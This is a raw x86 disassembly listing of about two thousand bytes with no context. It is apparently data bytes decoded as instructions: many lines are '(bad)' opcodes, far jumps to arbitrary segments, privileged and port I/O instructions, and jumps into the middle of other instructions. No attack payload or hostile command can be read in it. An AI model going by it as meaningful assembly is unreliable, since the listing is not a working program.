  4194d3:	inc    edi
  4194d4:	stos   BYTE PTR es:[edi],al
  4194d5:	sub    al,0xc
  4194d7:	sahf   
  4194d8:	cmp    BYTE PTR [ecx+0x42],dl
  4194db:	ret    0x2a49
  4194de:	dec    esi
  4194df:	pop    esi
  4194e0:	fild   DWORD PTR [edx]
  4194e2:	xlat   BYTE PTR ds:[ebx]
  4194e3:	aad    0x11
  4194e5:	scas   al,BYTE PTR es:[edi]
  4194e6:	jecxz  0x41947d
  4194e8:	mov    esp,0x5ab0d6
  4194ed:	add    bl,BYTE PTR [edi+0x87809fa]
  4194f3:	adc    al,0x88
  4194f5:	jp     0x419500
  4194f7:	cmc    
  4194f8:	cmp    ebx,DWORD PTR [ebx-0x75a743e5]
  4194fe:	jae    0x41948c
  419500:	push   esp
  419501:	dec    edx
  419502:	jno    0x4194cb
  419504:	jmp    0x24945d12
  419509:	adc    al,0x18
  41950b:	pop    esi
  41950c:	or     bl,BYTE PTR [ecx]
  41950e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41950f:	call   0x16259333
  419514:	lods   eax,DWORD PTR ds:[esi]
  419515:	add    dh,0x80
  419518:	jl     0x419581
  41951a:	repnz or eax,0xcb7cb1c2
  419520:	rcr    edi,0xa
  419523:	dec    ecx
  419524:	adc    DWORD PTR [ebx-0x18],esp
  419527:	dec    esp
  419528:	cmp    eax,0xb30ea10c
  41952d:	sahf   
  41952e:	lods   al,BYTE PTR ds:[esi]
  41952f:	sbb    edi,DWORD PTR [ecx+0x58ce3444]
  419535:	aas    
  419536:	xchg   BYTE PTR [ebp-0xa],ah
  419539:	popa   
  41953a:	dec    ebx
  41953b:	scas   al,BYTE PTR es:[edi]
  41953c:	sbb    ebx,eax
  41953e:	out    dx,eax
  41953f:	and    eax,DWORD PTR [ebp-0x71]
  419542:	jns    0x419587
  419544:	push   0x27223873
  419549:	inc    esp
  41954a:	mov    eax,ds:0x97756c58
  41954f:	pop    ebp
  419550:	aad    0xc5
  419552:	iret   
  419553:	sbb    eax,0xdf185b0
  419558:	fmul   DWORD PTR [ebx-0x6d8e99a5]
  41955e:	push   ss
  41955f:	aad    0x5c
  419561:	xchg   DWORD PTR [edx+0x2cca2a26],eax
  419567:	(bad)  
  41956a:	loope  0x419521
  41956c:	das    
  41956d:	inc    ebx
  41956e:	cmp    ebp,edi
  419570:	in     al,dx
  419571:	mov    al,ds:0xc7785c01
  419576:	sbb    DWORD PTR [esi+0x63],eax
  419579:	test   DWORD PTR [eax*8+0x5066a0b8],esp
  419580:	stc    
  419581:	outs   dx,DWORD PTR ds:[esi]
  419582:	jecxz  0x419565
  419584:	mov    es,WORD PTR [ecx+0x4]
  419587:	and    eax,0x2c0d03f6
  41958c:	jle    0x419580
  41958e:	sub    dh,bl
  419590:	ds mov esi,0x8cf318f9
  419596:	jle    0x419548
  419598:	cs inc edx
  41959a:	loopne 0x41951d
  41959c:	ror    DWORD PTR [edx],1
  41959e:	add    DWORD PTR [ebp-0x1671e763],esi
  4195a4:	pop    ecx
  4195a5:	mov    ah,0x5c
  4195a7:	mov    DWORD PTR [edx+0x46d60988],eax
  4195ad:	mov    cl,bl
  4195af:	lods   al,BYTE PTR ds:[esi]
  4195b0:	pop    es
  4195b1:	int3   
  4195b2:	xchg   DWORD PTR [edx+0x71],esp
  4195b5:	sahf   
  4195b6:	je     0x41953c
  4195b8:	dec    esp
  4195b9:	jo     0x419602
  4195bb:	aam    0x5c
  4195bd:	enter  0x9ddf,0x31
  4195c1:	dec    edi
  4195c2:	cwde   
  4195c3:	sbb    eax,0x4d2f50f7
  4195c8:	push   es
  4195c9:	das    
  4195ca:	mov    dl,0x2d
  4195cc:	jge    0x419570
  4195ce:	call   0x725d8b18
  4195d3:	int3   
  4195d4:	pop    es
  4195d5:	mov    ecx,0xa6fd617c
  4195da:	sbb    ebx,ebx
  4195dc:	inc    eax
  4195dd:	addr16 mov ds:0xf5e9,al
  4195e1:	imul   ebp,DWORD PTR [esi+0x22],0x2d3cd1fb
  4195e8:	mov    edx,0xf887e270
  4195ed:	xchg   edi,eax
  4195ee:	idiv   al
  4195f0:	loope  0x4195c0
  4195f2:	leave  
  4195f3:	push   ecx
  4195f4:	ficom  WORD PTR [esi-0xcb2a9a2]
  4195fa:	sub    ebp,edi
  4195fc:	jecxz  0x419661
  4195fe:	inc    eax
  4195ff:	ficom  WORD PTR [esi]
  419601:	fsubr  st,st(5)
  419603:	fidiv  DWORD PTR [edx]
  419605:	out    dx,eax
  419606:	mov    ds:0x796a3eb9,al
  41960b:	jl     0x41965e
  41960d:	(bad)  
  41960e:	enter  0x9ef3,0xef
  419612:	and    edx,DWORD PTR [ebp-0x1eab3b0f]
  419618:	cs pop ds
  41961a:	cmp    ebp,DWORD PTR [ebx-0x7a6d8f18]
  419620:	jecxz  0x4196a0
  419622:	test   BYTE PTR ds:0xbe76c864,ah
  419628:	adc    edx,DWORD PTR [ecx+0x453d65b8]
  41962e:	or     eax,0xdbedf01e
  419633:	fsubr  st,st(5)
  419635:	mov    edi,0x6bf5b971
  41963a:	iret   
  41963b:	fimul  DWORD PTR [edi-0x54]
  41963e:	retf   0xa1de
  419641:	jae    0x41961a
  419643:	enter  0x47e6,0x6a
  419647:	xchg   al,dh
  419649:	mov    ?,edx
  41964b:	xchg   esp,ecx
  41964d:	adc    bh,BYTE PTR [ebx+0x7c639891]
  419653:	(bad)  
  419654:	sub    al,0x31
  419656:	push   ebx
  419657:	add    al,BYTE PTR [edx]
  419659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41965a:	mov    cl,0xa2
  41965c:	jmp    0xe701005e
  419661:	bound  esp,QWORD PTR [ecx]
  419663:	cmp    BYTE PTR [edx-0x78],0x3c
  419667:	inc    eax
  419668:	pushf  
  419669:	int    0x77
  41966b:	pop    ds
  41966c:	xchg   ecx,eax
  41966d:	jb     0x419604
  41966f:	mov    ds:0xdedafc62,eax
  419674:	sub    eax,0x5d12b909
  419679:	sti    
  41967a:	adc    al,0x49
  41967c:	add    al,0xa9
  41967e:	inc    esi
  41967f:	jbe    0x419698
  419681:	cmp    dh,ch
  419683:	dec    eax
  419684:	sub    BYTE PTR [ebx],ch
  419686:	jge    0x4196a2
  419688:	sub    DWORD PTR [eax+0x265e3e4d],ebx
  41968e:	mov    esp,0xdef4d110
  419693:	popa   
  419694:	mov    esi,0x97a22814
  419699:	jo     0x4196cd
  41969b:	cmc    
  41969c:	ds sbb al,0xd7
  41969f:	fs push ebx
  4196a1:	pop    eax
  4196a2:	dec    esp
  4196a3:	xor    eax,eax
  4196a5:	or     bh,BYTE PTR [ebx+edx*4-0x41150b26]
  4196ac:	cld    
  4196ad:	push   ebx
  4196ae:	mov    bl,dh
  4196b0:	xor    eax,DWORD PTR [ecx+0x70]
  4196b3:	push   ds
  4196b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b5:	leave  
  4196b6:	lods   eax,DWORD PTR ds:[esi]
  4196b7:	add    eax,0xb819e1a7
  4196bc:	pop    ecx
  4196bd:	mul    DWORD PTR [edx+0x15]
  4196c0:	clc    
  4196c1:	mov    cs,WORD PTR [ecx]
  4196c3:	dec    ecx
  4196c4:	mov    ebx,0x582b545
  4196c9:	dec    ecx
  4196ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196cb:	cs ins BYTE PTR es:[edi],dx
  4196cd:	dec    esp
  4196ce:	fld    st(5)
  4196d0:	xchg   ebx,eax
  4196d1:	ja     0x419722
  4196d3:	fdivr  DWORD PTR [esp+eax*4-0x1fcf5bb]
  4196da:	ds cmp al,0xa
  4196dd:	mov    ds:0x445a6ee7,al
  4196e2:	lods   al,BYTE PTR ds:[esi]
  4196e3:	inc    edi
  4196e4:	div    DWORD PTR [eax-0x6f]
  4196e7:	push   es
  4196e8:	cli    
  4196e9:	or     ebp,DWORD PTR [ebx+0xf]
  4196ec:	push   es
  4196ed:	mov    edi,0xa36680b
  4196f2:	dec    ebp
  4196f3:	inc    edx
  4196f4:	stc    
  4196f5:	xchg   BYTE PTR [edx],cl
  4196f7:	jmp    0x4ed:0x5951c852
  4196fe:	sub    bh,dh
  419700:	adc    bh,BYTE PTR [ebp-0x36]
  419703:	(bad)  
  419706:	push   cs
  419707:	(bad)
  41970b:	clc    
  41970c:	pop    eax
  41970d:	cli    
  41970e:	xor    ch,dl
  419710:	imul   esi,edx,0x4126fc8b
  419716:	push   esp
  419717:	lods   al,BYTE PTR ds:[esi]
  419718:	jno    0x419712
  41971a:	mov    ds:0xd035dc9b,al
  41971f:	mov    eax,ds:0xf44b88ce
  419724:	fiadd  WORD PTR [edx-0x4c]
  419727:	out    0x37,al
  419729:	stos   BYTE PTR es:[edi],al
  41972a:	sub    al,0x34
  41972c:	sbb    al,0xd2
  41972e:	cmp    eax,0x3875643b
  419733:	fmul   DWORD PTR [esi+0x50]
  419736:	(bad)  
  419737:	loopne 0x419732
  419739:	enter  0x5ffd,0xc1
  41973d:	sbb    bl,BYTE PTR [eax+0x62]
  419740:	inc    edi
  419741:	push   ds
  419742:	out    0xd9,eax
  419744:	(bad)  
  419745:	jnp    0x419709
  419747:	pop    es
  419748:	push   ecx
  419749:	jle    0x419721
  41974b:	imul   edi,DWORD PTR [esi+0x63adad72],0xffffffcb
  419752:	inc    ebp
  419753:	pop    eax
  419754:	js     0x4197b8
  419756:	mov    ecx,0x2f066d2f
  41975b:	add    ebx,0x7813a906
  419761:	out    0xcc,eax
  419763:	mov    dl,0x5
  419765:	sbb    DWORD PTR [ebx+eax*2-0x2e],0xc51d5a5e
  41976d:	sahf   
  41976e:	mov    dh,0xe8
  419770:	mov    dh,0xe3
  419772:	jge    0x4197b3
  419774:	std    
  419775:	ja     0x4197b8
  419777:	push   cs
  419778:	(bad)  
  419779:	push   ecx
  41977a:	ret    0x3d63
  41977d:	dec    eax
  41977e:	sub    eax,DWORD PTR [esi-0x654785b]
  419784:	mov    bh,0x5e
  419786:	mov    ebx,0x55758e14
  41978b:	add    BYTE PTR [ecx+eax*1],bh
  41978e:	rcl    BYTE PTR [edi-0x27],1
  419791:	out    dx,al
  419792:	cmp    bh,0x28
  419795:	xor    DWORD PTR [ebp+0x17],eax
  419798:	and    DWORD PTR [eax],esi
  41979a:	xchg   edx,eax
  41979b:	sbb    al,BYTE PTR [edi]
  41979d:	xchg   DWORD PTR [ecx],ebp
  41979f:	mov    ecx,0x8db9fc28
  4197a4:	(bad)  [ebx*1-0x179e1f77]
  4197ab:	mov    bl,0xcd
  4197ad:	mov    ch,ah
  4197af:	mov    ebx,0x87772dbf
  4197b4:	adc    BYTE PTR [esi],dl
  4197b6:	fdivr  st,st(2)
  4197b8:	(bad)  
  4197b9:	pop    edx
  4197ba:	adc    BYTE PTR [esi],bl
  4197bc:	ins    DWORD PTR es:[edi],dx
  4197bd:	std    
  4197be:	mov    esp,0xeadafe51
  4197c3:	test   al,0xa0
  4197c5:	jb     0x4197af
  4197c7:	mov    al,0xfc
  4197c9:	adc    ecx,eax
  4197cb:	in     al,dx
  4197cc:	push   0xd
  4197ce:	jae    0x41980b
  4197d0:	jbe    0x419819
  4197d2:	lock mov edx,0xb4dd880d
  4197d8:	xor    bl,cl
  4197da:	ins    DWORD PTR es:[edi],dx
  4197db:	mov    ebp,0xc0c6ea3
  4197e0:	sbb    al,0xd2
  4197e2:	hlt    
  4197e3:	call   DWORD PTR [ebp+0x36e90138]
  4197e9:	pop    ecx
  4197ea:	lock lds ebp,FWORD PTR [eax+0x1c]
  4197ee:	jb     0x4197d7
  4197f0:	cmp    ebp,edi
  4197f2:	cmp    DWORD PTR [ebx-0x2f9c0c33],edx
  4197f8:	repz loop 0x419844
  4197fb:	mov    ds:0x301ec08e,eax
  419800:	cmp    ch,dl
  419802:	mov    BYTE PTR [eax-0x47],bh
  419805:	(bad)  
  419806:	mov    dl,0x41
  419808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419809:	dec    edx
  41980a:	mov    edi,0x94e7c7bb
  41980f:	or     eax,0x7bc0a902
  419814:	test   BYTE PTR ds:0xbed5ee0e,ah
  41981a:	aaa    
  41981b:	retf   
  41981c:	ins    BYTE PTR es:[edi],dx
  41981d:	jmp    0x89ede67
  419822:	push   ss
  419823:	fisub  DWORD PTR [ebx+0x2]
  419826:	pusha  
  419827:	pop    ecx
  419828:	pop    es
  419829:	xchg   esp,eax
  41982a:	pop    ebx
  41982b:	cld    
  41982c:	or     DWORD PTR [esi],eax
  41982e:	mov    WORD PTR [esi+0x7e13b54],cs
  419834:	mov    ecx,0x82850195
  419839:	inc    ebp
  41983a:	lahf   
  41983b:	push   es
  41983c:	aad    0xb8
  41983e:	imul   esp,DWORD PTR [ebp+0x7e],0xffffffd0
  419842:	mov    edi,0xc390b9b
  419847:	lds    edx,FWORD PTR [eax+0x49]
  41984a:	xchg   esp,eax
  41984b:	mov    BYTE PTR ds:0xb27e3966,ch
  419851:	test   eax,0x7cb87e43
  419856:	mov    al,ds:0xdbe1191b
  41985b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985c:	sub    al,BYTE PTR [eax]
  41985e:	mov    DWORD PTR [edx],esp
  419860:	pop    esi
  419861:	xor    al,0x68
  419863:	mov    BYTE PTR [edi+0x77d22c7e],ch
  419869:	loope  0x4198dc
  41986b:	mov    ch,0xb2
  41986d:	in     al,dx
  41986e:	sbb    DWORD PTR [ebp+0x1e811365],ebp
  419874:	imul   edi,DWORD PTR [eax+0x58],0x49b5106b
  41987b:	jge    0x419886
  41987d:	aam    0xd9
  41987f:	pop    eax
  419880:	mov    ch,0x45
  419882:	stos   DWORD PTR es:[edi],eax
  419883:	fwait
  419884:	dec    edi
  419885:	(bad)  [ebx+0x45d99f47]
  41988b:	stos   BYTE PTR es:[edi],al
  41988c:	das    
  41988d:	dec    edx
  41988e:	std    
  41988f:	and    ch,BYTE PTR [ebx-0x6af2a138]
  419895:	aas    
  419896:	cmc    
  419897:	into   
  419898:	fcom   DWORD PTR [ecx-0x59]
  41989b:	(bad)  
  41989c:	lahf   
  41989d:	adc    bl,BYTE PTR [edx]
  41989f:	into   
  4198a0:	push   ss
  4198a1:	not    BYTE PTR [esp+esi*8]
  4198a4:	jne    0x41991d
  4198a6:	add    eax,0x26df17b6
  4198ab:	xchg   ecx,eax
  4198ac:	jecxz  0x4198c7
  4198ae:	loope  0x419894
  4198b0:	mov    ecx,0xc8e63993
  4198b5:	sahf   
  4198b6:	jmp    0x41990f
  4198b8:	cwde   
  4198b9:	mov    ecx,DWORD PTR [ecx-0x72123c3]
  4198bf:	stc    
  4198c0:	mov    BYTE PTR [edi+edi*4-0x78],dl
  4198c4:	mov    ah,ch
  4198c6:	pop    esp
  4198c7:	mov    cl,0x98
  4198c9:	call   0x9555:0x3f419c61
  4198d0:	sub    eax,0x5dd9c91b
  4198d5:	mov    ss,esi
  4198d7:	cs dec ebx
  4198d9:	jecxz  0x41993a
  4198db:	lds    esp,FWORD PTR [ecx+0x6de25b66]
  4198e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e2:	loopne 0x419924
  4198e4:	loope  0x4198ee
  4198e6:	xor    eax,0xddcf36
  4198eb:	push   0xffffffb1
  4198ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ee:	jno    0x41990b
  4198f0:	addr16 neg cl
  4198f3:	(bad)  
  4198f4:	fadd   QWORD PTR [ecx]
  4198f6:	lods   eax,DWORD PTR ds:[esi]
  4198f7:	mov    WORD PTR [eax+0x3158274b],?
  4198fd:	cmp    al,0x82
  4198ff:	jmp    0xf41d:0xa68ae926
  419906:	dec    esi
  419907:	inc    ebp
  419908:	fstp   DWORD PTR [esi-0x29]
  41990b:	aam    0x35
  41990d:	mov    dh,0x63
  41990f:	xor    dh,BYTE PTR [esi-0xe]
  419912:	repz aas 
  419914:	or     ebp,DWORD PTR [ebx+0x67294521]
  41991a:	cmp    DWORD PTR [edi+0x20b88a48],eax
  419920:	adc    ecx,DWORD PTR [ebx]
  419922:	inc    ebp
  419923:	add    esp,ebx
  419925:	mov    eax,DWORD PTR ds:0x42c1e84a
  41992b:	pop    ecx
  41992c:	add    al,0xe6
  41992e:	xchg   dh,bh
  419930:	inc    ecx
  419931:	in     al,dx
  419932:	sahf   
  419933:	rcr    DWORD PTR [eax+0x40],0x8
  419937:	mov    DWORD PTR [ecx-0x6f94d77e],0x813d49f0
  419941:	sahf   
  419942:	xor    BYTE PTR [eax+eiz*1+0x2d0f0957],bl
  419949:	ds pop es
  41994b:	(bad)  
  41994c:	(bad)  
  41994d:	xacquire xchg DWORD PTR [ebx],ecx
  419950:	inc    esp
  419951:	out    dx,al
  419952:	mov    ecx,DWORD PTR [edx-0x53ac6602]
  419958:	xor    ebp,DWORD PTR [edi+0x1e72c4b2]
  41995e:	mov    WORD PTR [ebp-0x31],?
  419961:	jnp    0x419965
  419963:	inc    edx
  419964:	push   ebx
  419965:	jle    0x41995e
  419967:	(bad)  
  419968:	cmp    DWORD PTR [ebx+edi*2],ebx
  41996b:	jmp    0x155c:0x60eb2a3f
  419972:	repnz mov ch,0xde
  419975:	stos   DWORD PTR es:[edi],eax
  419976:	sahf   
  419977:	sbb    esi,esi
  419979:	pusha  
  41997a:	mov    ecx,0x5f67f238
  41997f:	daa    
  419980:	sub    edx,DWORD PTR [ebp-0x3e]
  419983:	dec    esp
  419984:	in     al,dx
  419985:	xor    ch,BYTE PTR [ebx+0xf2bd1ec]
  41998b:	nop
  41998c:	daa    
  41998d:	xchg   ebp,eax
  41998e:	xor    BYTE PTR [esi+0xf6561a6],ch
  419994:	mov    edi,0x369ab8ac
  419999:	arpl   WORD PTR [edx+0xa],si
  41999c:	cmp    cl,ch
  41999e:	or     al,0x1
  4199a0:	(bad)  
  4199a1:	xor    eax,0xe40bdbfa
  4199a6:	cli    
  4199a7:	pop    edx
  4199a8:	adc    ch,BYTE PTR ds:0xdccf93b0
  4199ae:	jno    0x419972
  4199b0:	mov    ss,WORD PTR [esi-0x6a63982]
  4199b6:	fstp   st(2)
  4199b8:	rcr    BYTE PTR [esi],1
  4199ba:	sbb    eax,0x4485f301
  4199bf:	inc    ebx
  4199c0:	push   ebp
  4199c1:	adc    ebp,ebx
  4199c3:	lock push eax
  4199c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c6:	inc    ebp
  4199c7:	sbb    DWORD PTR [ebp+0x6df5ab67],esp
  4199cd:	into   
  4199ce:	inc    edi
  4199cf:	mov    eax,ds:0x9b8b938a
  4199d4:	push   edx
  4199d5:	adc    al,0xa0
  4199d7:	mov    al,0xe1
  4199d9:	push   ecx
  4199da:	fisttp WORD PTR [edi+0x17a7d202]
  4199e0:	mov    ebp,0x89563681
  4199e5:	pop    ebx
  4199e6:	pop    esp
  4199e7:	adc    eax,0xe91645f0
  4199ec:	fdiv   QWORD PTR [ebp+0x67]
  4199ef:	inc    ecx
  4199f0:	jns    0x419a38
  4199f2:	push   esi
  4199f3:	inc    ebx
  4199f4:	imul   eax
  4199f6:	xor    al,0xd1
  4199f8:	add    esp,DWORD PTR ds:0x99dea8d
  4199fe:	xor    BYTE PTR cs:[edx-0x7f3a36cc],ch
  419a05:	dec    esp
  419a06:	out    dx,al
  419a07:	cs xchg ecx,eax
  419a09:	jo     0x419a41
  419a0b:	loopne 0x419993
  419a0d:	in     eax,0xb8
  419a0f:	popa   
  419a10:	lds    ebp,FWORD PTR [ecx+0xa]
  419a13:	ror    DWORD PTR [ecx+0x66],1
  419a16:	mov    bh,0xcf
  419a18:	clc    
  419a19:	mov    eax,0x98a98bb
  419a1e:	ret    0x42bc
  419a21:	xchg   ebp,eax
  419a22:	js     0x419a0f
  419a24:	int    0xc9
  419a26:	pop    edi
  419a27:	or     al,0x8a
  419a29:	out    0xbb,ax
  419a2c:	enter  0x8aac,0x63
  419a30:	dec    ebp
  419a31:	mov    ds:0x680dc6a6,al
  419a36:	das    
  419a37:	xor    ch,bh
  419a39:	sbb    bl,ch
  419a3b:	dec    ebx
  419a3c:	stc    
  419a3d:	out    dx,eax
  419a3e:	xchg   DWORD PTR [ecx-0x5aa07caa],edx
  419a44:	or     edi,DWORD PTR [edi+0x626bf4af]
  419a4a:	retf   
  419a4b:	(bad)  
  419a4c:	outs   dx,BYTE PTR ds:[esi]
  419a4d:	rcr    BYTE PTR [eax],0xf7
  419a50:	xor    ch,BYTE PTR [esi-0x47fd7f1c]
  419a56:	xor    al,BYTE PTR [ecx-0x43]
  419a59:	push   es
  419a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a5b:	xchg   edx,eax
  419a5c:	nop
  419a5d:	push   esi
  419a5e:	inc    ecx
  419a5f:	gs mov edi,0x68bcb233
  419a65:	pop    DWORD PTR [ebp+0x26]
  419a68:	inc    edx
  419a69:	mov    ebx,0xddfd4e84
  419a6e:	outs   dx,WORD PTR ds:[esi]
  419a70:	retf   
  419a71:	jnp    0x419a74
  419a73:	push   ebp
  419a74:	add    DWORD PTR [edx-0x60],edi
  419a77:	js     0x419a5b
  419a79:	lea    esp,[ecx+eax*8]
  419a7c:	pop    ebx
  419a7d:	mov    al,ds:0xec049063
  419a82:	cmp    BYTE PTR [ebx+0x4f],ah
  419a85:	or     eax,0x2458869f
  419a8a:	scas   al,BYTE PTR es:[edi]
  419a8b:	mov    edx,0x9d0bf019
  419a90:	push   cs
  419a91:	lock paddusb mm0,QWORD PTR [eax+0x46a56590]
  419a99:	in     al,dx
  419a9a:	fstp   TBYTE PTR [ebx-0x39]
  419a9d:	aad    0x24
  419a9f:	sbb    eax,0x7ea2f79f
  419aa4:	ss je  0x419a36
  419aa7:	jge    0x419a52
  419aa9:	js     0x419aad
  419aab:	ficomp WORD PTR [eax]
  419aad:	outs   dx,DWORD PTR ds:[esi]
  419aae:	xor    al,0x5f
  419ab0:	fstp   QWORD PTR [ebx-0x6daf02d3]
  419ab6:	mov    al,0x88
  419ab8:	cmp    ch,BYTE PTR [edi+0x545b3119]
  419abe:	std    
  419abf:	shl    DWORD PTR [edx+0x2310c18a],0xf1
  419ac6:	shl    ebp,cl
  419ac8:	loop   0x419b30
  419aca:	inc    ebp
  419acb:	push   es
  419acc:	cld    
  419acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ace:	mov    dl,0x24
  419ad0:	cmp    al,0xf8
  419ad2:	xchg   DWORD PTR [edx],ebp
  419ad4:	sub    DWORD PTR [edi],ebx
  419ad6:	push   edx
  419ad7:	push   esp
  419ad8:	mov    esi,0xfa3a1e94
  419add:	iret   
  419ade:	jmp    0x507cc15d
  419ae3:	mov    eax,ds:0xe29ff99a
  419ae8:	call   0xcd74:0x3c4ccc6c
  419aef:	out    0x2e,al
  419af1:	inc    esi
  419af2:	fwait
  419af3:	lods   eax,DWORD PTR ds:[esi]
  419af4:	mov    eax,0xe628676e
  419af9:	sar    BYTE PTR [ebp-0x1fcddc68],1
  419aff:	sub    ch,BYTE PTR [edx]
  419b01:	jb     0x419af1
  419b03:	lds    ebp,FWORD PTR [esp+ecx*4]
  419b06:	jge    0x419b6d
  419b08:	out    0x17,eax
  419b0a:	xchg   ebp,eax
  419b0b:	push   edi
  419b0c:	pop    edi
  419b0d:	fisubr WORD PTR [edi]
  419b0f:	jno    0x419ae3
  419b11:	inc    ecx
  419b12:	lock sbb al,0x40
  419b15:	shl    DWORD PTR [esi-0x8],cl
  419b18:	sahf   
  419b19:	inc    esp
  419b1a:	mov    DWORD PTR ds:0xf7484bed,ebx
  419b20:	inc    esp
  419b21:	xor    DWORD PTR [esi-0x3c],esi
  419b24:	mov    DWORD PTR [edx],edx
  419b26:	add    DWORD PTR [eax-0x4fb08bff],esp
  419b2c:	inc    ebp
  419b2d:	test   bh,al
  419b2f:	inc    edi
  419b30:	fdiv   st(3),st
  419b32:	setle  al
  419b35:	outs   dx,BYTE PTR ds:[esi]
  419b36:	mov    cl,0x4
  419b38:	and    BYTE PTR [esi],bl
  419b3a:	jp     0x419aeb
  419b3c:	push   ecx
  419b3d:	ret    
  419b3e:	mov    fs,WORD PTR [edi-0x2c]
  419b41:	leave  
  419b42:	add    BYTE PTR [edx+0x1b],al
  419b45:	popf   
  419b46:	sbb    edx,DWORD PTR [ecx]
  419b48:	hlt    
  419b49:	mov    edx,0x168d5e3c
  419b4e:	push   esi
  419b4f:	sbb    edx,DWORD PTR [eax]
  419b51:	bnd jbe 0x419b32
  419b54:	addr16 loopne 0x419bb7
  419b57:	mov    ds:0x3f406f61,al
  419b5c:	pop    edi
  419b5d:	push   ecx
  419b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b5f:	mov    edi,0x2019d9f5
  419b64:	ret    
  419b65:	imul   ebp,DWORD PTR [edi],0x53b1e312
  419b6b:	(bad)  
  419b6c:	xchg   edx,eax
  419b6d:	sar    DWORD PTR [edi-0x508fa6d],cl
  419b73:	loope  0x419bc7
  419b75:	(bad)  
  419b76:	pop    ebp
  419b77:	pop    esp
  419b78:	ret    0x9931
  419b7b:	pop    es
  419b7c:	mov    al,ds:0x72f1865e
  419b81:	push   eax
  419b82:	out    dx,eax
  419b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b84:	sti    
  419b85:	mov    bl,0x58
  419b87:	sti    
  419b88:	sub    DWORD PTR [ebx+0x43],eax
  419b8b:	push   ss
  419b8c:	in     eax,dx
  419b8d:	in     al,dx
  419b8e:	xor    dh,BYTE PTR [edi+0x544381e2]
  419b94:	lock pop ebx
  419b96:	retf   0xb5f
  419b99:	sub    bl,BYTE PTR [edi]
  419b9b:	mov    eax,0x31b3d03
  419ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ba1:	jge    0x419bcc
  419ba3:	pop    DWORD PTR [ebp-0x54]
  419ba6:	inc    edi
  419ba7:	mov    esp,0x47196ee3
  419bac:	scas   al,BYTE PTR es:[edi]
  419bad:	pop    ds
  419bae:	sar    DWORD PTR ds:0x72ea859a,0xbd
  419bb5:	out    0xfc,eax
  419bb7:	in     al,0xa0
  419bb9:	popf   
  419bba:	xchg   edx,eax
  419bbb:	in     eax,dx
  419bbc:	mov    al,0x63
  419bbe:	out    dx,al
  419bbf:	or     al,bh
  419bc1:	inc    edx
  419bc2:	int3   
  419bc3:	jno    0x419bda
  419bc5:	dec    edx
  419bc6:	lods   eax,DWORD PTR ds:[esi]
  419bc7:	mov    ebp,gs
  419bc9:	out    dx,al
  419bca:	xor    ecx,DWORD PTR [eax]
  419bcc:	aam    0xdf
  419bce:	inc    esi
  419bcf:	cwde   
  419bd0:	cmp    eax,0xab449625
  419bd6:	lea    edx,[esi-0x47]
  419bd9:	iret   
  419bda:	lds    esi,FWORD PTR [esi+eiz*2-0x247a24c5]
  419be1:	call   0xafce:0x6314c0e0
  419be8:	fnsave [edi]
  419bea:	pop    es
  419beb:	jmp    0x419bb9
  419bed:	das    
  419bee:	dec    edi
  419bef:	ret    
  419bf0:	ret    
  419bf1:	inc    esp
  419bf2:	les    esp,FWORD PTR [edi+0x67]
  419bf5:	in     eax,dx
  419bf6:	ins    DWORD PTR es:[edi],dx
  419bf7:	les    esi,FWORD PTR [eax-0x5d]
  419bfa:	scas   eax,DWORD PTR es:[edi]
  419bfb:	inc    ebx
  419bfc:	push   0x36
  419bfe:	(bad)  
  419bff:	out    dx,eax
  419c00:	jno    0x419bef
  419c02:	jle    0x419bd5
  419c04:	pop    ss
  419c05:	dec    edx
  419c06:	jecxz  0x419bbb
  419c08:	sti    
  419c09:	imul   edi,DWORD PTR [ebp-0x1acb9dc6],0x6e0a2135
  419c13:	imul   ebp
  419c15:	add    DWORD PTR [ecx],ebx
  419c17:	mov    dl,0x65
  419c19:	xlat   BYTE PTR ds:[ebx]
  419c1a:	in     al,dx
  419c1b:	sar    DWORD PTR [ecx],cl
  419c1d:	gs pop esp
  419c1f:	pop    ebp
  419c20:	mov    ah,0x76
  419c22:	jmp    0x419bce
  419c24:	mov    al,0x6d
  419c26:	popa   
  419c27:	mov    ah,0x39
  419c29:	sub    eax,0xb695cfad
  419c2e:	cld    
  419c2f:	jl     0x419c3b
  419c31:	xchg   ebx,eax
  419c32:	repz int3 
  419c34:	fdivr  DWORD PTR [eax]
  419c36:	jnp    0x419bd5
  419c38:	inc    esi
  419c39:	rol    ebx,cl
  419c3b:	lods   al,BYTE PTR ds:[esi]
  419c3c:	mov    al,0x7a
  419c3e:	jne    0x419bca
  419c40:	into   
  419c41:	mov    DWORD PTR [eax+0x2],esp
  419c44:	push   0xa608ae4a
  419c49:	int3   
  419c4a:	pop    edi
  419c4b:	ja     0x419bd1
  419c4d:	sahf   
  419c4e:	dec    eax
  419c4f:	inc    edi
  419c50:	mov    DWORD PTR [edx],edi
  419c52:	cmc    
  419c53:	inc    esi
  419c54:	xor    edi,DWORD PTR [ebx+0x5c139113]
  419c5a:	pop    ecx
  419c5b:	int3   
  419c5c:	xlat   BYTE PTR ds:[ebx]
  419c5d:	in     eax,0x12
  419c5f:	mov    edi,0x4d5e1245
  419c64:	xor    ah,bl
  419c66:	mov    bh,0x62
  419c68:	jge    0x419c88
  419c6a:	mov    edx,0x3a60e8e
  419c6f:	inc    esp
  419c70:	outs   dx,DWORD PTR ds:[esi]
  419c71:	outs   dx,DWORD PTR ds:[esi]
  419c72:	stc    
  419c73:	ret    
  419c74:	xchg   esp,eax
  419c75:	(bad)  
  419c76:	push   ss
  419c77:	jmp    0xa8d8:0xb9810e73
  419c7e:	lds    edx,FWORD PTR ds:0xfdc17698
  419c84:	xor    al,BYTE PTR [ebx-0x64e7aedd]
  419c8a:	inc    esp
  419c8b:	ds icebp 
  419c8d:	pop    ebx
